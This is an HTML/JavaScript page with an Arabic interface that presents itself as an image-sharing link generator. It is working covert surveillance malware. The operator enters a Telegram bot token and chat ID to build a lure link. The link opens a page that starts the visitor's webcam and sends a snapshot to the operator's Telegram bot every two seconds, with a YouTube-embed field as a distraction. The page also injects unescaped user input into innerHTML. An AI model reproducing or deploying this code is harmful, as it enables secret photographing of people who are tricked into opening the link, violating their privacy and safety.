<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>مشارك الصور</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #0d0b1a;
      color: #fff;
      margin: 0;
      padding: 20px;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      background-color: #1a1530;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
    }
    h1, h2 {
      text-align: center;
      color: #a66bff;
    }
    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
      color: #ccc;
    }
    input[type="text"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #444;
      border-radius: 5px;
      margin-bottom: 15px;
      background: #222;
      color: #fff;
    }
    button {
      background-color: #a66bff;
      color: white;
      border: none;
      padding: 10px 15px;
      border-radius: 5px;
      cursor: pointer;
      width: 100%;
      font-size: 16px;
    }
    button:hover {
      background-color: #8246d9;
    }
    #linkContainer {
      margin-top: 20px;
      display: none;
    }
    #shareLink {
      padding: 10px;
      background-color: #2a223f;
      border: 1px dashed #a66bff;
      border-radius: 5px;
      word-break: break-all;
      color: #fff;
    }
    #video, #canvas {
      width: 100%;
      max-width: 500px;
      border-radius: 8px;
      border: 1px solid #444;
      margin-top: 10px;
    }
    #resultImage {
      max-width: 100%;
      margin-top: 15px;
      border-radius: 8px;
      display: none;
    }
    #uploadStatus {
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
    }
    iframe {
      margin-top: 20px;
      width: 100%;
      height: 315px;
      border: none;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <div class="container" id="mainContainer">
    <h1>مولد رابط المشاركة</h1>
    <label for="tokenInput">توكن البوت:</label>
    <input type="text" id="tokenInput" placeholder="أدخل توكن البوت الخاص بك">
    
    <label for="chatInput">Chat ID:</label>
    <input type="text" id="chatInput" placeholder="أدخل Chat ID (مثال: 6197511637)">
    
    <button id="generateBtn">إنشاء رابط المشاركة</button>
    
    <div id="linkContainer">
      <h3>رابط المشاركة:</h3>
      <div id="shareLink"></div>
      <button id="copyBtn" style="margin-top: 10px;">نسخ الرابط</button>
    </div>
  </div>

  <div class="container" id="cameraContainer" style="display:none;">
    <h2>التصوير التلقائي</h2>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <div id="uploadStatus"></div>
    <label for="urlInput">🔗 أدخل لينك (مثلاً يوتيوب):</label>
    <input type="text" id="urlInput" placeholder="ضع الرابط هنا ثم اضغط Enter">
    <div id="iframeContainer"></div>
  </div>

  <script>
    const mainContainer = document.getElementById('mainContainer');
    const cameraContainer = document.getElementById('cameraContainer');
    const tokenInput = document.getElementById('tokenInput');
    const chatInput = document.getElementById('chatInput');
    const generateBtn = document.getElementById('generateBtn');
    const linkContainer = document.getElementById('linkContainer');
    const shareLink = document.getElementById('shareLink');
    const copyBtn = document.getElementById('copyBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const uploadStatus = document.getElementById('uploadStatus');
    const urlInput = document.getElementById('urlInput');
    const iframeContainer = document.getElementById('iframeContainer');

    const urlParams = new URLSearchParams(window.location.search);
    const shareId = urlParams.get('id');
    const token = urlParams.get('token');
    const chatId = urlParams.get('chat');

    // ✅ لو الرابط فيه توكن وID → ندخل على صفحة الكاميرا
    if (shareId && token && chatId) {
      mainContainer.style.display = 'none';
      cameraContainer.style.display = 'block';
      initCamera();
      setInterval(captureAndSend, 2000); // صورة كل ثانيتين
    }

    // إنشاء رابط المشاركة
    generateBtn.addEventListener('click', function() {
      const tokenVal = tokenInput.value.trim();
      const chatVal = chatInput.value.trim();
      if (!tokenVal || !chatVal) {
        alert("يرجى إدخال التوكن وChat ID");
        return;
      }
      const uniqueId = generateUniqueId();
      const link = `${window.location.origin}${window.location.pathname}?id=${uniqueId}&token=${encodeURIComponent(tokenVal)}&chat=${encodeURIComponent(chatVal)}`;
      shareLink.textContent = link;
      linkContainer.style.display = 'block';
    });

    // نسخ الرابط
    copyBtn.addEventListener('click', function() {
      navigator.clipboard.writeText(shareLink.textContent).then(() => {
        alert("تم نسخ الرابط!");
      });
    });

    // تهيئة الكاميرا
    function initCamera() {
      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(function(stream) {
          video.srcObject = stream;
        })
        .catch(function(err) {
          uploadStatus.textContent = '❌ خطأ في الكاميرا: ' + err.message;
          uploadStatus.style.color = 'red';
        });
    }

    // التقاط وإرسال
    function captureAndSend() {
      if (!video.videoWidth) return;
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(function(blob) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'image.png');

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: 'POST',
          body: formData
        })
        .then(res => res.json())
        .then(data => {
          if (data.ok) {
            uploadStatus.textContent = '✅ تم إرسال صورة للبوت';
            uploadStatus.style.color = 'lime';
          } else {
            uploadStatus.textContent = '❌ خطأ: ' + data.description;
            uploadStatus.style.color = 'red';
          }
        })
        .catch(err => {
          uploadStatus.textContent = '❌ خطأ إرسال: ' + err.message;
          uploadStatus.style.color = 'red';
        });
      }, 'image/png');
    }

    // إضافة لينك (يوتيوب/موقع) للصفحة
    urlInput.addEventListener('keypress', function(e) {
      if (e.key === 'Enter') {
        const val = urlInput.value.trim();
        if (val) {
          iframeContainer.innerHTML = `<iframe src="${val}" allowfullscreen></iframe>`;
        }
      }
    });

    function generateUniqueId() {
      return Math.random().toString(36).substring(2) + Date.now().toString(36);
    }
  </script>
</body>
</html>
